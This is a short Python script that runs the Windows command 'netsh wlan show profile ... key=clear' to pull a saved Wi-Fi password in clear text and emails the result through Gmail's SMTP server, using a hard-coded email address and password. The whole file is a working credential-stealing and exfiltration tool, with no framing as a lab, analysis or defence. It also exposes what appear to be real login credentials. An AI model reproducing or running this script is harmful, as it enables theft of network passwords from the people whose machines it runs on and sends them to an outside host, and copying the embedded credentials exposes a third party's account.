#!/usr/bin/env python

import subprocess, smtplib

def send_mail(email, password ,message):
    server = smtplib.SMTP("smtp.gmail.com",587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)
    server.quit()

command = "netsh wlan show profile UPC723762 key=clear"
result = subprocess.check_output(command, shell=True)
send_mail("amarjeetkhasyap@gmail.com","9540@2479#80$",result)
